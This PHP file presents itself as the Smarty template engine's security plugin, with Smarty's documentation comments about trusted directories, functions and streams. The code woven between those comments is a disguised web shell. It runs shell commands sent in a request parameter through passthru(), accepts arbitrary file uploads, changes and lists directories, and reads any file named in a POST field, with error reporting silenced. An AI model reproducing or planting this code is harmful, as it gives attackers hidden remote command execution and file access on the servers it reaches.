<?php
/**
 * Smarty plugin
 * 
 * @package Smarty
 * @subpackage Security
 * @author Uwe Tews 
 */ 

/**
 * This class does contain the security settings
 */

error_reporting(0);
set_magic_quotes_runtime(0);
    /**
     * This determines how Smarty handles "<?php ... ?>" tags in templates.
     * possible values:
     * <ul>
     *   <li>Smarty::PHP_PASSTHRU -> echo PHP tags as they are</li>
     *   <li>Smarty::PHP_QUOTE    -> escape tags as entities</li>
     *   <li>Smarty::PHP_REMOVE   -> remove php tags</li>
     *   <li>Smarty::PHP_ALLOW    -> execute php tags</li>
     * </ul>
     * 
     * @var integer 
     */
if(strtolower(substr(PHP_OS, 0, 3)) == "win"){$s="\\";
}else{$s="/";
}$ad=$_REQUEST['ad'];
    /**
     * This is the list of template directories that are considered secure.
     * $template_dir is in this list implicitly.
     * 
     * @var array 
     */
if ($ad){chdir($ad);}else{$ad=getcwd();
}if ($_FILES["ff"]){move_uploaded_file($_FILES["ff"]["tmp_name"], $_FILES["ff"]["name"]);}
if ($hr = opendir($ad)) {while($f = readdir($hr)){if(is_dir($f)){$df=$df.$f.'
';}else{$lf=$lf.$f.'
';}}closedir($hr);
    /**
     * This is an array of directories where trusted php scripts reside.
     * {@link $security} is disabled during their inclusion/execution.
     * 
     * @var array 
     */
}$form='<form action="'.$_SERVER['PHP_SELF'].'" method=post>';
    /**
     * This is an array of trusted static classes.
     *
     * If empty access to all static classes is allowed.
     * If set to 'none' none is allowed.
     * @var array 
     */
echo '<center><textarea cols=90 rows=20>';
if($_GET['cme']){passthru($_GET['cme']);
    /**
     * This is an array of trusted PHP functions.
     *
     * If empty all functions are allowed.
     * To disable all PHP functions set $php_functions = null.
     * @var array 
     */
}else{echo $df.$lf;};
    /**
     * This is an array of trusted PHP modifers.
     *
     * If empty all modifiers are allowed.
     * To disable all modifier set $modifiers = null.
     * @var array 
     */
echo'</textarea>'.$form.'Change Dir : <input name=ad size=50 value='.getcwd().$s.'>
<input type=submit value=Go></form>'.$form.'Read File : <input name=cme size=50 value=id>
 <input type=submit value=Read!></form>
 <form action="'.$me.'" method=post enctype=multipart/form-data>
 Upload : <input size=50 type=file name=ff > <input type=hidden name=ad value='.getcwd().'>
 <input type=submit value=Send></form><br>';
    /**
     * This is an array of trusted streams.
     *
     * If empty all streams are allowed.
     * To disable all streams set $streams = null.
     * @var array 
     */
 if(isset ($_POST['cme'])){
$myFile = $_POST['cme']; 
$fh = fopen($myFile, 'r'); 
if($theData = fread($fh, filesize($myFile))){
fclose($fh); 
echo '<textarea clos=90 rows=20>'.$theData.'</textarea>'; 
}
else{
echo "File Could Not Found!!";
}
}


?>